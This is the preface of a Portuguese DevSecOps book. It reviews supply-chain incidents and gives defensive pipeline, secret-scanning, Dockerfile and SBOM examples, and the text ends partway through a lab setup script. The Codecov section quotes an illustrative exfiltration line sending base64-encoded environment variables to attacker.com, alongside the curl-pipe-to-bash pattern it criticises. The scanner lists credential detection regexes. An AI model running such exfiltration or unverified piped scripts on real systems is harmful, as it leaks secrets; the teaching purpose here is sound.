---
layout: default
title: "00-prefacio"
---

# Prefácio — DevSecOps na Prática

> "Segurança não é um produto, é um processo."
> — Bruce Schneier

---

## 1. Por que DevSecOps na Prática

### 1.1 A Brecha entre Teoria e Realidade

A indústria de software vive uma contradição permanente. De um lado, existem milhares de livros, whitepapers e normas que descrevem como software deveria ser desenvolvido de forma segura. Do outro, a realidade dos times é dominada por pressão por entrega, dívida técnica acumulada e um fluxo de trabalho onde a segurança é tratada como obstáculo, não como habilitadora.

Essa brecha não é acidental. Ela é o resultado de décadas de tratamento da segurança como uma etapa final — uma "fase de revisão" que acontece antes da publicação, quando já é tarde demais para corrigir problemas arquiteturais. O modelo clássico de desenvolvimento em cascata incentivava essa separação: times diferentes, objetivos diferentes, cronogramas diferentes. A segurança vivia em sua torre de marfim, revisando o que outros construíram.

Com a adoção de metodologias ágeis e práticas DevOps, a velocidade de entrega aumentou drasticamente. Deploys que antes aconteciam uma vez por mês agora ocorrem dezenas de vezes por dia. Porém, a segurança não acompanhou essa transformação. O resultado é previsível: vulnerabilidades entram em produção antes de serem detectadas, equipes de segurança ficam sobrecarregadas com alertas, e a confiança entre desenvolvimento e segurança se degrada.

O caso da **SolarWinds** (2020) ilustra essa realidade com brutalidade. Uma atualização de rotina do software Orion — usada por 18.000 empresas, incluindo agências governamentais dos Estados Unidos — foi comprometida em sua própria cadeia de suprimentos. O atacante inseriu código malicioso no processo de build do SolarWinds, e a atualização assinada digitalmente foi distribuída para todos os clientes. O resultado: acesso não autorizado a sistemas em pelo menos 250 organizações, durante nove meses, sem detecção.

```bash
# O comprometimento da SolarWinds aconteceu no processo de build.
# Veja como uma cadeia de suprimentos típica funciona:
#
# Desenvolvedor → Repositório → CI Build → Artefato Assinado → Distribuição
#
# O atacante inseriu código malicioso no estágio "CI Build",
# e o artefato resultante era indistinguível de uma atualização legítima.
#
# Uma pipeline moderna com DevSecOps deveria ter detectado:
# 1. Anomalias no comportamento do compilador
# 2. Assinaturas incomuns nos artefatos gerados
# 3. Comunicações de rede anômalas após a instalação
# 4. Mudanças no SBOM que não correspondiam a commits legítimos

# Verificação básica de SBOM (Software Bill of Materials)
# que poderia ter ajudado a identificar componentes comprometidos:
syft . -o spdx-json > sbom.json
grype sbom:sbom.json --fail-on high
```

### 1.2 Por Que a Segurança Continua Falhando em Ambientes Ágeis

Existem razões estruturais para o fracasso recorrente da segurança em ambientes ágeis. Vamos analisar as principais:

**Velocidade versus Aprofundamento.** Times ágeis operam em sprints curtos, com entregas incrementais. A segurança tradicional exige revisões profundas, auditorias completas e documentação extensa. Esses dois ritmos são fundamentalmente incompatíveis. Quando forçados a escolher, times priorizam a entrega — e a segurança perde.

**Falta de Contexto.** Ferramentas de segurança tradicionais geram alertas sem contexto de negócio. Um desenvolvedor recebe uma notificação de "vulnerabilidade crítica" mas não sabe se aquela vulnerabilidade é explorável no contexto específico da aplicação. O resultado é ruído e desaprovação progressiva das ferramentas de segurança.

**Responsabilidade Difusa.** Em muitas organizações, a segurança é "responsabilidade de todos" — o que, na prática, significa que não é responsabilidade de ninguém. Sem ownership claro, vulnerabilidades ficam abertas indefinidamente.

**Retrospectivas Incompletas.** Quando incidentes de segurança ocoruem, a análise frequentemente foca em "quem errou" em vez de "por que o processo permitiu o erro". Sem aprendizado sistêmico, os mesmos padrões de falha se repetem.

O ataque ao **Codecov Bash Uploader** (2021) demonstra como um único ponto de falha pode comprometer milhares de organizações. O atacante modificou o script de upload do Codecov para exfiltrar variáveis de ambiente — incluindo tokens de acesso a repositórios, chaves de API e credenciais de cloud. Organizações que usavam o Codecov em suas pipelines de CI/CD expuseram silenciosamente suas credenciais mais sensíveis durante meses.

```bash
# O script malicioso do Codecov capturava variáveis de ambiente
# e as enviava para um servidor controlado pelo atacante.
# Aqui está um exemplo de como uma pipeline típica poderia ser comprometida:

# Antes (pipeline legítima):
curl -s https://codecov.io/bash | bash

# O atacante modificou o script para incluir algo como:
# curl -s https://codecov.io/bash | head -n 5  # Primeiras 5 linhas legítimas
# # ... resto do script malicioso
# curl -s "https://attacker.com/exfil?env=$(env | base64)" # Exfiltração

# COMO O DEVSECOPS DEVERIA PROTEGER:
# 1. Nunca execute scripts baixados diretamente da internet
# 2. Use checksums e assinaturas verificadas
# 3. Implemente controle de acesso a variáveis de ambiente sensíveis
# 4. Monitore tráfego de rede suspeito em pipelines

# Exemplo de verificação de integridade antes da execução:
CHECKSUM_FILE="codecov.sha256"
EXPECTED_HASH="a1b2c3d4e5f6..."
DOWNLOAD_URL="https://codecov.io/bash"

curl -sSL "$DOWNLOAD_URL" -o codecov.sh
ACTUAL_HASH=$(sha256sum codecov.sh | awk '{print $1}')

if [ "$ACTUAL_HASH" != "$EXPECTED_HASH" ]; then
    echo "ERRO: Checksum não confere!" >&2
    echo "Esperado: $EXPECTED_HASH" >&2
    echo "Obtido:   $ACTUAL_HASH" >&2
    exit 1
fi

# Melhor ainda: use o Codecov CLI com autenticação
# em vez de bash uploader
pip install codecov-cli
codecovcli upload-process --fail-on-error
```

### 1.3 A Promessa e o Desafio do DevSecOps

DevSecOps não é uma ferramenta, um framework ou uma certificação. É uma filosofia de trabalho que incorpora segurança em cada etapa do ciclo de vida do software — desde a concepção até a operação e o descomissionamento.

A promessa é ambiciosa mas factível: construir software onde a segurança é uma propriedade emergente do processo, não uma inspeção aplicada externamente. Em um time DevSecOps maduro, um desenvolvedor não precisa ser especialista em segurança — mas o pipeline de entrega deve ser capaz de detectar, bloquear e reportar automaticamente as vulnerabilidades mais comuns.

O desafio é igualmente grande. Implementar DevSecOps requer mudança cultural, automação sofisticada, treinamento contínuo e — talvez o mais difícil — aceitação de que segurança adiciona complexidade ao sistema. Não existe atalho.

```yaml
# Exemplo de uma pipeline GitHub Actions com DevSecOps integrado
# Isso demonstra como múltiplas ferramentas de segurança
# podem trabalhar em conjunto durante o build

name: DevSecOps Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read
  security-events: write  # Para uploads de SARIF
  actions: read
  checks: write

jobs:
  # Fase 1: Análise estática de código
  sast:
    name: Análise Estática (SAST)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Necessário para Semgrep diff-aware

      - name: Semgrep SAST
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten
          generateSarif: true
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

      - name: Upload SARIF para GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: semgrep.sarif

  # Fane 2: Análise de dependências
  dependency-scan:
    name: Análise de Dependências (SCA)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Snyk Open Source
        uses: snyk/actions/python@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          command: test
          args: --all-projects --severity-threshold=high

      - name: Dependabot Alerts (built-in)
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0

  # Fase 3: Análise de container
  container-scan:
    name: Análise de Container
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build da imagem
        run: docker build -t myapp:${{ github.sha }} .

      - name: Trivy scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          exit-code: 1

      - name: Upload Trivy SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-results.sarif

  # Fase 4: Verificação de secrets
  secrets-scan:
    name: Detecção de Secrets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: TruffleHog
        uses: trufflesecurity/trufflehog@main
        with:
          extra_args: --only-verified
```

### 1.4 A Abordagem deste Livro

Este livro não é mais um catálogo de ferramentas ou uma coleção de recomendações abstratas. É um guia prático, construído a partir de situações reais, que mostra como implementar segurança em pipelines de entrega de software.

Cada capítulo inclui:

- **Contexto**: por que aquele assunto importa, com casos públicos documentados
- **Ferramentas**: como configurar e usar cada ferramenta, com versões fixadas
- **Código funcional**: exemplos em Bash, Python, YAML, Dockerfile e Go
- **Padrão vulnerável vs. seguro**: comparações diretas mostrando o antes e o depois
- **Laboratório**: exercícios práticos que você pode executar em seu ambiente local

Não assumimos que o leitor é especialista em segurança nem que é noviço em DevOps. O caminho intermediário — profissionais competentes que precisam incorporar segurança ao seu trabalho diário — é nosso público-alvo principal.

### 1.5 O que Acontece sem DevSecOps: Casos Públicos

Os seguintes incidentes documentam publicamente o custo da ausência de práticas de segurança integradas ao ciclo de vida do software. Cada caso é analisado ao longo deste livro nos capítulos correspondentes.

#### Caso 1: SolarWinds Orion (2020)

**O que aconteceu**: Atacantes comprometeram a cadeia de suprimentos do SolarWinds, inserindo código malicioso em atualizações do software de gerenciamento de rede Orion. A atualização comprometida foi distribuída para aproximadamente 18.000 organizações.

**Impacto**: Acesso não autorizado a sistemas governamentais e corporativos nos Estados Unidos durante aproximadamente nove meses. Agências afetadas incluíram o Departamento do Tesouro, o Departamento de Comércio, o Departamento de Segurança Interna e o Departamento de Energia.

**Causa raiz**: Comprometimento do ambiente de build e ausência de verificação de integridade na cadeia de suprimentos.

**Lição para DevSecOps**: Implementação de SBOM (Software Bill of Materials), verificação de integridade de artefatos, e monitoramento de comportamento anômalo em ambientes de build.

#### Caso 2: Codecov Bash Uploader (2021)

**O que aconteceu**: Atacantes modificaram o script bash-uploader do Codecov, um instrumento amplamente usado para relatórios de cobertura de código. O script modificado exfiltrava variáveis de ambiente para um servidor externo.

**Impacto**: Credenciais expostas por aproximadamente dois meses. Organizações afetadas incluíram empresas Fortune 500 e projetos de código aberto de grande visibilidade.

**Causa raiz**: Execução não verificada de scripts de terceiros em pipelines de CI/CD.

**Lição para DevSecOps**: Pinning de versões de ferramentas, verificação de checksums, controle de acesso a variáveis de ambiente sensíveis, e monitoramento de tráfego de rede em pipelines.

#### Caso 3: 3CX Supply Chain (2023)

**O que aconteceu**: O aplicativo de desktop do 3CX — usado por 600.000 organizações — foi comprometido através de uma cadeia de suprimentos em duas camadas. O atacante inicial comprometeu um dependency (Trading Technologies' X_TRADER), que por sua vez comprometeu o build do 3CX.

**Impacto**: Aproximadamente 600.000 organizações expostas, incluindo empresas do setor financeiro, governo e energia.

**Causa raiz**: Falta de isolamento no processo de build e ausência de verificação de integridade de dependências.

**Lição para DevSecOps**: Isolamento de ambientes de build, verificação de integridade em múltiplas camadas da cadeia de suprimentos, e detecção de comportamento anômalo no processo de compilação.

#### Caso 4: xz-utils Backdoor (CVE-2024-3094)

**O que aconteceu**: Uma backdoor foi inserida nas versões 5.6.0 e 5.6.1 da biblioteca xz-utils, uma dependência fundamental de sistemas Linux. A backdoor foi inserida por um maintainer que ganhou confiança ao longo de vários anos de contribuições legítimas.

**Impacto**: A backdoor permitia autenticação remota via SSH em sistemas afetados. Afetou principais distribuições Linux incluindo Fedora, Debian e OpenSUSE.

**Causa raiz**: Ataque de engenharia social prolongado contra um projeto de código aberto com maintainer único, combinado com ausência de verificação de integridade em dependências de sistema.

**Lição para DevSecOps**: Verificação de proveniência de dependências, revisão de mudanças em bibliotecas críticas, e implementação de mecanismos de fallback em cadeias de suprimentos.

#### Caso 5: Log4Shell (CVE-2021-44228)

**O que aconteceu**: Uma vulnerabilidade de execução remota de código (RCE) foi descoberta na biblioteca Apache Log4j, amplamente utilizada em aplicações Java em todo o mundo. A vulnerabilidade permitia que atacantes executassem código arbitrário através de strings maliciosas em logs.

**Impacto**: Impactou milhões de servidores e aplicações em todo o mundo. Empresas como Apple, Amazon, Twitter, Cloudflare e milhares de outras foram afetadas. A severidade foi classificada como 10.0/10 no CVSS.

**Causa raiz**: Biblioteca com superfície de ataque excessiva, dependência em cascata difícil de rastrear, e falta de revisão de segurança em componentes transitivity.

**Lição para DevSecOps**: Análise de dependências transitivas, SBOM para mapeamento completo de superfície de ataque, e atualização automatizada de dependências com verificação de segurança.

#### Caso 6: Capital One (2019)

**O que aconteceu**: Uma engenheira de segurança descobriu uma vulnerabilidade no WAF (Web Application Firewall) da Capital One que, combinada com uma configuração errada no IAM (Identity and Access Management) da AWS, permitiu acesso a dados de 100 milhões de clientes armazenados no S3.

**Impacto**: Exposição de dados pessoais de 100 milhões de clientes e solicitantes de crédito nos Estados Unidos e Canadá. Multa de 80 milhões de dólares imposta pelo OCC (Office of the Comptroller of the Currency).

**Causa raiz**: Configuração incorreta do WAF e permissões excessivas no IAM da AWS.

**Lição para DevSecOps**: Infrastructure as Code com políticas de segurança, revisão automatizada de configuração de cloud, e princípio do menor privilegio em permissões.

#### Caso 7: Travis CI Secrets Leak (2021)

**O que aconteceu**: Uma vulnerabilidade no Travis CI expôs variáveis de ambiente criptografadas de repositórios públicos e privados. Tokens de acesso, chaves de API e credenciais de deploy ficaram acessíveis por meio de logs de build de repositórios públicos.

**Impacto**: Credenciais de milhares de repositórios expostas, permitindo acesso não autorizado a repositórios, packages e ambientes de deploy.

**Causa raiz**: Logs de build acessíveis publicamente que continham variáveis de ambiente sensíveis em texto plano.

**Lição para DevSecOps**: Nunca logar variáveis de ambiente sensíveis, usar sistemas de secrets management dedicados (Vault, AWS Secrets Manager), e implementar controle de acesso granular a secrets em pipelines.

#### Caso 8: GitHub Actions Supply Chain Attacks

**O que aconteceu**: Atacantes criaram repositórios com nomes similares a Actions populares, comprometendo build scripts que eram importados por projetos legítimos. Os Actions maliciosos exfiltravam secrets e modificavam artefatos de build.

**Impacto**: Múltiplos projetos de código aberto tiveram secrets e artefatos comprometidos.

**Causa raiz**: Importação de GitHub Actions por referência de branch (não por SHA), permitindo que alterações maliciosas em branches fossem automaticamente incorporadas.

**Lição para DevSecOps**: Pinning de Actions por SHA completa, revisão de Actions antes de uso, e uso de allowlists para Actions aprovadas.

#### Caso 9: Docker Hub Malicious Images

**O que aconteceu**: Pesquisadores de segurança identificaram milhares de imagens maliciosas no Docker Hub, incluindo cryptominers, reverse shells e imagens que exfiltravam credenciais de builds.

**Impacto**: Organizações que baixaram imagens não verificadas expuseram seus ambientes de build e deploy a comprometimento.

**Causa raiz**: Ausência de verificação de proveniência e integridade de imagens de container, confiança cega em imagens públicas.

**Lição para DevSecOps**: Usar apenas imagens de publishers verificados, implementar scan de imagens no pipeline, e manter registry privado com políticas de aprovação.

---

## 2. Obrigação Ética e Impacto

### 2.1 Responsabilidade do Desenvolvedor em Pipelines CI/CD

O desenvolvedor moderno não escreve apenas código. Ele escreve pipelines, configura infraestrutura, gerencia secrets e opera serviços. Cada uma dessas responsabilidades tem implicações de segurança diretas.

Quando um desenvolvedor configura uma pipeline de CI/CD, ele está definindo confiança: quais repositórios podem acessar quais recursos, quais scripts podem executar em quais ambientes, quais credenciais são usadas para quais operações. Uma configuração incorreta pode expor secrets, permitir execução de código arbitrário, ou conceder permissões excessivas.

A responsabilidade ética do desenvolvedor vai além de "escrever código seguro". Ela inclui:

- **Não expor secrets em código ou configurações**: commits, logs, variáveis de ambiente, arquivos de configuração
- **Não executar scripts não verificados**: qualquer script baixado de fonte externa deve ser verificado antes da execução
- **Reportar vulnerabilidades descobertas**: inclusive em dependências e ferramentas de terceiros
- **Documentar decisões de segurança**: por que uma determinada abordagem foi escolhida em vez de outra
- **Participar de revisões de segurança**: não apenas de código, mas de configurações e políticas

```python
# Exemplo: Gerenciamento seguro de secrets em pipelines CI/CD
# Este script demonstra como extrair secrets de forma segura
# e como detectar secrets expostos em repositórios

import os
import re
import sys
from pathlib import Path
from typing import List, Tuple

# Padrões para detecção de secrets em código
SECRET_PATTERNS = [
    (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9+/=_-]{16,})["\']', 'API Key'),
    (r'(?i)(secret|password|passwd|pwd)\s*[=:]\s*["\']([^"\']{8,})["\']', 'Secret/Password'),
    (r'(?i)(token|access_token|auth_token)\s*[=:]\s*["\']([A-Za-z0-9+/=_-]{16,})["\']', 'Token'),
    (r'(?i)(private[_-]?key)\s*[=:]?\s*["\']?((?:-----BEGIN )?[A-Z]+ PRIVATE KEY)', 'Private Key'),
    (r'(?i)aws[_-]?(secret[_-]?access[_-]?key|access[_-]?key[_-]?id)\s*[=:]\s*["\']([A-Za-z0-9/+=]{20,})["\']', 'AWS Credential'),
    (r'(?i)(ghp_|gho_|github_pat_)[A-Za-z0-9]{36,}', 'GitHub Token'),
    (r'(?i)-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----', 'Private Key Block'),
]

# Padrões que NÃO são secrets (falsos positivos)
FALSE_POSITIVE_PATTERNS = [
    r'(?i)(example|sample|placeholder|dummy|test|mock|fake|xxx)',
    r'(?i)your[_-]?(api[_-]?key|secret|token|password)',
    r'(?i)<[a-z_]+>',  # Placeholders como <token>
    r'(?i)TODO|FIXME|HACK',
    r'["\']?REPLACE[_-]ME["\']?',
]


def is_false_positive(matched_text: str) -> bool:
    """Verifica se um match é um falso positivo."""
    for pattern in FALSE_POSITIVE_PATTERNS:
        if re.search(pattern, matched_text):
            return True
    return False


def scan_file(file_path: Path) -> List[Tuple[int, str, str]]:
    """
    Escaneia um arquivo em busca de secrets potenciais.

    Retorna lista de tuplas: (linha, tipo_detectado, contexto)
    """
    findings = []

    try:
        content = file_path.read_text(encoding='utf-8', errors='ignore')
    except (OSError, UnicodeDecodeError):
        return findings

    for line_number, line in enumerate(content.splitlines(), start=1):
        for pattern, secret_type in SECRET_PATTERNS:
            match = re.search(pattern, line)
            if match and not is_false_positive(match.group(0)):
                # Mascarar o valor encontrado para não expor o secret
                masked = mask_secret(match.group(0))
                findings.append((line_number, secret_type, masked))

    return findings


def mask_secret(text: str) -> str:
    """Mascara um secret, revelando apenas os primeiros e últimos caracteres."""
    if len(text) <= 8:
        return '*' * len(text)
    return text[:4] + '*' * (len(text) - 8) + text[-4:]


def scan_directory(
    directory: Path,
    extensions: Tuple[str, ...] = ('.py', '.js', '.ts', '.yaml', '.yml', '.json', '.env', '.cfg', '.conf', '.toml')
) -> dict:
    """
    Escaneia um diretório inteiro em busca de secrets.

    Retorna dicionário com achados por arquivo.
    """
    all_findings = {}

    for ext in extensions:
        for file_path in directory.rglob(f'*{ext}'):
            # Ignorar diretórios de node_modules, .git, etc.
            if any(skip in file_path.parts for skip in ['.git', 'node_modules', '__pycache__', '.venv', 'venv']):
                continue

            findings = scan_file(file_path)
            if findings:
                all_findings[str(file_path)] = findings

    return all_findings


def generate_report(findings: dict) -> str:
    """Gera um relatório dos secrets encontrados."""
    lines = []
    lines.append('=' * 60)
    lines.append('RELATÓRIO DE SECRETS — DevSecOps na Prática')
    lines.append('=' * 60)
    lines.append('')

    if not findings:
        lines.append('Nenhum secret potencial encontrado.')
        lines.append('Status: LIMPO')
        return '\n'.join(lines)

    total = sum(len(f) for f in findings.values())
    lines.append(f'Status: {total} SECRET(S) POTENCIAL(IS) DETECTADO(S)')
    lines.append(f'Arquivos afetados: {len(findings)}')
    lines.append('')

    for file_path, file_findings in findings.items():
        lines.append(f'Arquivo: {file_path}')
        lines.append('-' * 40)
        for line_num, secret_type, masked_value in file_findings:
            lines.append(f'  Linha {line_num}: [{secret_type}] {masked_value}')
        lines.append('')

    lines.append('=' * 60)
    lines.append('AÇÕES RECOMENDADAS:')
    lines.append('1. Mova secrets para um gerenciador de secrets (Vault, AWS SM)')
    lines.append('2. Adicione o arquivo ao .gitignore')
    lines.append('3. Use variáveis de ambiente ou secrets do CI/CD')
    lines.append('4. Se o secret foi commitado, rotacione IMEDIATAMENTE')
    lines.append('=' * 60)

    return '\n'.join(lines)


def main():
    if len(sys.argv) < 2:
        print('Uso: python detect_secrets.py <diretório>')
        print('Exemplo: python detect_secrets.py ./meu-projeto')
        sys.exit(1)

    target_dir = Path(sys.argv[1])
    if not target_dir.exists():
        print(f'Erro: Diretório não encontrado: {target_dir}')
        sys.exit(1)

    print(f'Escaneando: {target_dir.resolve()}')
    print('...')

    findings = scan_directory(target_dir)
    report = generate_report(findings)
    print(report)

    # Retorna código de erro se secrets foram encontrados
    if findings:
        sys.exit(1)


if __name__ == '__main__':
    main()
```

### 2.2 Confiança na Cadeia de Suprimentos

A cadeia de suprimentos de software é o conjunto de todos os componentes, dependências, ferramentas e processos que contribuem para a criação de um artefato final. Cada elo nessa cadeia é um ponto potencial de comprometimento.

Os casos de SolarWinds, 3CX e xz-utils demonstram que atacantes estão cada vez mais direcionando a cadeia de suprimentos em vez de atacar diretamente alvos individuais. Comprometer uma única dependência pode afetar milhares de organizações simultaneamente.

```dockerfile
# Exemplo: Construção de imagem Docker com verificação de integridade
# Esta abordagem demonstra como implementar DevSecOps em Dockerfiles

# Stage 1: Build com verificações de segurança
FROM golang:1.22-alpine AS builder

# Instalar ferramentas de verificação de segurança
RUN apk add --no-cache git curl gnupg

# Verificar integridade do módulo Go
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod verify

# Copiar código fonte
COPY . .

# Executar testes e verificação estática
RUN go vet ./...
RUN go test -race ./...

# Verificar dependências com govulncheck
RUN go install golang.org/x/vuln/cmd/govulncheck@latest
RUN govulncheck ./...

# Build final
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/server .

# Stage 2: Imagem final mínima
FROM gcr.io/distroless/static-debian12:nonroot

# Copiar apenas o binário
COPY --from=builder /app/server /server

# Executar como usuário não-root (distroless já configura isso)
USER nonroot:nonroot

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/server", "healthcheck"]

EXPOSE 8080
ENTRYPOINT ["/server"]
```

### 2.3 Implicações Legais: LGPD, GDPR e SBOM

A legislação de proteção de dados está cada vez mais rigorosa em relação à segurança da informação. No Brasil, a LGPD (Lei Geral de Proteção de Dados — Lei nº 13.709/2018) estabelece que o controlador e o operador devem adotar medidas técnicas e administrativas aptas a proteger os dados pessoais. No contexto de software, isso significa que vulnerabilidades que levem a vazamento de dados pessoais podem resultar em multas de até 2% do faturamento, limitadas a R$ 50 milhões por infração.

Na União Europeia, o GDPR (General Data Protection Regulation) impõe requisitos ainda mais rigorosos, com multas de até 4% do faturamento anual global ou 20 milhões de euros, o que for maior. Além disso, o GDPR exige notificação de violações em até 72 horas.

A diretiva NIS2 (Network and Information Security) da União Europeia, em vigor desde 2024, estende explicitamente os requisitos de segurança para fornecedores de software, incluindo exigência de SBOM (Software Bill of Materials) para componentes críticos.

```yaml
# Exemplo: Geração automatizada de SBOM em pipeline CI/CD
# SBOM é exigência crescente em regulamentações de segurança

name: SBOM Generation

on:
  push:
    branches: [main]
  release:
    types: [published]

jobs:
  sbom:
    name: Gerar SBOM
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Instalar Syft
        uses: anchore/sbom-action/download-syft@v0
        id: syft-install

      - name: Gerar SBOM (SPDX)
        run: |
          syft . \
            --output spdx-json=sbom-spdx.json \
            --output cyclonedx-json=sbom-cyclonedx.json \
            --source-name "${{ github.repository }}" \
            --source-version "${{ github.ref_name }}"

      - name: Verificar vulnerabilidades no SBOM
        uses: anchore/scan-action@v4
        id: scan
        with:
          sbom: sbom-spdx.json
          fail-build: true
          severity-cutoff: high

      - name: Upload SBOM como artifact
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: |
            sbom-spdx.json
            sbom-cyclonedx.json
          retention-days: 90

      - name: Publicar SBOM no release
        if: github.event_name == 'release'
        run: |
          gh release upload "${{ github.event.release.tag_name }}" \
            sbom-spdx.json \
            sbom-cyclonedx.json \
            --clobber
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Upload SBOM paraDependency Track
        if: hashFiles('sbom-cyclonedx.json') != ''
        run: |
          curl -X POST "${{ vars.DEPENDENCY_TRACK_URL }}/api/v1/bom" \
            -H "X-Api-Key: ${{ secrets.DEPENDENCY_TRACK_TOKEN }}" \
            -H "Content-Type: multipart/form-data" \
            -F "autoCreate=true" \
            -F "projectName=${{ github.event.repository.name }}" \
            -F "projectVersion=${{ github.ref_name }}" \
            -F "bom=@sbom-cyclonedx.json"
```

---

## 3. Público-Alvo

### 3.1 Engenheiros DevOps que Precisam de Segurança

Se você é um engenheiro DevOps, este livro é para você. Você já domina automação de infraestrutura, pipelines de CI/CD e orquestração de containers. Mas sabe que algo falta: segurança. Talvez você já tenha enfrentado um incidente que poderia ter sido evitado com as práticas certas. Talvez seus gestores estejam pedindo compliance e você não sabe por onde começar.

Este livro mostra como incorporar segurança ao seu trabalho diário sem sacrificar a velocidade de entrega. Você vai aprender a configurar ferramentas de segurança em suas pipelines existentes, a automatizar a detecção de vulnerabilidades e a implementar práticas que reduzem superfície de ataque sem adicionar burocracia.

### 3.2 Engenheiros de Segurança que Precisam de Automação

Se você é especialista em segurança, este livro também é para você. Você entende de vulnerabilidades, exploração e mitigação, mas precisa de formas automatizadas de aplicar esse conhecimento em escala. Revisões manuais não escalam. Auditorias pontuais não são suficientes.

Este livro mostra como traduzir conhecimento de segurança em automações funcionais: pipelines que detectam vulnerabilidades automaticamente, políticas que bloqueiam código inseguro antes de chegar a produção, e ferramentas que monitoram continuamente a superfície de ataque.

### 3.3 Desenvolvedores Construindo Pipelines Seguras

Se você é desenvolvedor e cuida da infraestrutura de entrega do seu projeto, este livro é para você. Talvez você não seja especialista em segurança, mas entende que precisa Incorporar boas práticas desde o início.

Este livro mostra como escrever código seguro, como configurar pipelines que detectam vulnerabilidades automaticamente, e como tomar decisões de segurança fundamentadas durante o desenvolvimento.

### 3.4 Arquitetos Projetando Entrega Segura

Se você é arquiteto, este livro é para você. Você projeta sistemas, define padrões e toma decisões que afetam toda a organização. Este livro fornece o conhecimento necessário para projetar pipelines de entrega que sejam seguras por design, não por inspeção.

---

## 4. Pré-Requisitos e Ambiente

### 4.1 Conhecimentos Necessários

Este livro assume que o leitor possui:

- **Experiência com Linux**: linha de comando, permissões, processos, gerenciamento de pacotes
- **Conhecimento básico de Git**: commits, branches, merge, pull requests
- **Familiaridade com containers**: conceitos básicos de Docker, imagens e containers
- **Noções de programação**: pelo menos uma linguagem (Python, Go, JavaScript, ou similar)
- **Experiência com CI/CD básico**: conceitos de integração contínua e entrega contínua

Não é necessário ter experiência prévia em segurança da informação. O livro introduz os conceitos necessários à medida que avança.

### 4.2 Configuração das Ferramentas

#### Docker e Docker Compose

```bash
#!/bin/bash
# setup-devsecops-lab.sh
# Script de configuração do ambiente de laboratório do livro
#
# Este script instala e configura todas as ferramentas necessárias
# para acompanhar os exercícios práticos deste livro.
#
# Uso: chmod +x setup-devsecops-lab.sh && ./setup-devsecops-lab.sh
#
# Requisitos:
#   - Ubuntu 22.04+ ou Debian 12+
#   - Acesso sudo
#   - Conexão com a internet

set -euo pipefail

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Funções auxiliares
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[OK]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Verificar se está rodando como root para instalações
check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "Execute como root: sudo ./setup-devsecops-lab.sh"
        exit 1
    fi
}

# Verificar sistema operacional
check_os() {
    if [ ! -f /etc/os-release ]; then
        log_error "Sistema operacional não suportado."
        exit 1
    fi

    . /etc/os-release
    if [ "$ID" != "ubuntu" ] && [ "$ID" != "debian" ]; then
        log_warn "Sistema não é Ubuntu/debian. Alguns passos podem falhar."
    fi

    log_info "Sistema detectado: $PRETTY_NAME"
}

# Atualizar sistema
update_system() {
    log_info "Atualizando sistema..."
    apt-get update -qq
    apt-get upgrade -y -qq
    log_success "Sistema atualizado."
}

# Instalar dependências básicas
install_base_deps() {
    log_info "Instalando dependências básicas..."
    apt-get install -y -qq \
        curl \
        wget \
        git \
        gnupg \
        lsb-release \
        apt-transport-https \
        ca-certificates \
        software-properties-common \
        unzip \
        jq \
        tree \
        make \
        gcc \
        g++
    log_success "Dependências básicas instaladas."
}

# Instalar Docker
install_docker() {
    log_info "Instalando Docker..."

    # Adicionar repositório oficial do Docker
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
        gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

    echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] \
        https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | \
        tee /etc/apt/sources.list.d/docker.list > /dev/null

    apt-get update -qq
    apt-get install -y -qq docker-ce docker-ce-cli containerd.io docker-compose-plugin

    # Adicionar usuário ao grupo docker (para uso sem sudo)
    if [ -n "${SUDO_USER:-}" ]; then
        usermod -aG docker "$SUDO_USER"
        log_info "Usuário $SUDO_USER adicionado ao grupo docker."
    fi

    # Verificar instalação
    docker --version
    docker compose version
    log_success "Docker instalado."
}

# Instalar Kubernetes local (minikube)
install_kubernetes() {
    log_info "Instalando minikube..."

    curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
    install minikube-linux-amd64 /usr/local/bin/minikube
    rm -f minikube-linux-amd64

    # Instalar kubectl
    curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
